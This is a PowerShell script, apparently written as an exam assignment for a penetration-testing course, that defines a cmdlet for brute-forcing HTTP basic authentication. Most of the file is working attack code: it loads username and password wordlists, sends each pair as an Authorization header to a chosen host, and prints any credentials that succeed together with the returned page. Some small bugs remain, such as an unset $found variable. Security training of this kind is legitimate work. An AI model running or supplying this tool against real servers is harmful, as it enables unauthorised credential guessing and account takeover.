## Powershell For Penetration Testers Exam Assignment 1 - Brute Force Basic Authentication Cmdlet
function BruteForce-Basic-Auth
{

<#

.SYNOPSIS
PowerShell cmdlet for brute forcing http basic authentication.

.DESCRIPTION
The powershell script will try to authenticate to the webserver using the bruetforce approach for basic authentication.

.PARAMETER Target
Specifies the hostname or IP address to connect to.

.PARAMETER Port
Specifies the port of the basic authentication server. Default is 80.

.PARAMETER UnameList
Specifies a list of usernames to use for the brute force.

.PARAMETER PassList
Specifies a list of passwords to use for the brute force.

.PARAMETER StopOnSuccess
Use this switch to stop the brute force attack on the first success.

.PARAMETER Delay
Specifies the seconds of delay between brute-force attempts, defaults is 0.

.EXAMPLE
PS > . .\BruteForce-Basic-Auth.ps1
PS > BruteForce-Basic-Auth -Url IP/Url -User path\to\userwordlist -Password path\to\passwordlist -StopOnSuccess true 

.CREDIT
https://gist.github.com/brandonmwest/a2632d0a65088a20c00a
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3250

#>

[CmdletBinding()] Param(
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [Alias("IP","IPAddress","Url","Domain")]
        [String]
        $Target, 

        [Parameter(Mandatory = $true)]
        [Alias('User')]
        [String]
        $UnameList,

        [Parameter(Mandatory = $true)]
        [Alias('Password')]
        [String]
        $PassList,
                     
        [Parameter(Mandatory = $false)]
        [String]
        $Port = "80",

        [Parameter(Mandatory = $false)]
        [String]
        $StopOnSuccess = "True",

        [Parameter(Mandatory = $false)]
        [UInt32]
        $Delay = 0
)
#   target url string
    $url = "http://" + $Target + ":" + $Port
#   Read in lists for usernames and passwords
	$Unames = Get-Content $UnameList
	$Pass = Get-Content $PassList

:UNAMEloop foreach ($Username in $Unames)
  {
    foreach ($Password in $Pass)
    {
        $base64Auth = [convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($Username+":"+$Password))) #Converting username and password in following format- base64(uname:pass)
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.add('Authorization','Basic '+$base64Auth) #Adding Authorization Header with Basic keyword and base64(uname:pass)
        Try
      {
      
        Write-Host "Checking $Username : $Password" -ForegroundColor Yellow
        $message
        $content = $webClient.DownloadString($url)
        $success = $true
        if ($success -eq $true)
        {
          # Credential found
          Write-Host "Match found! $Username : $Password" -ForegroundColor Green
          Write-Host $content -ForegroundColor White
          if ($StopOnSuccess)
          {
            break UNAMEloop
          }
        }
      }
      Catch
      {
        $success = $false
        Write-verbose 'Credentials does not match'
      }
      if ($Delay -gt 0){
        Write-Verbose "Sleeping $delay seconds"
        Start-Sleep -Seconds $delay
      }
    }
  }
  if ($found -eq  $false){
    Write-Output "Sorry, Credentials Not Found :("
  }
}
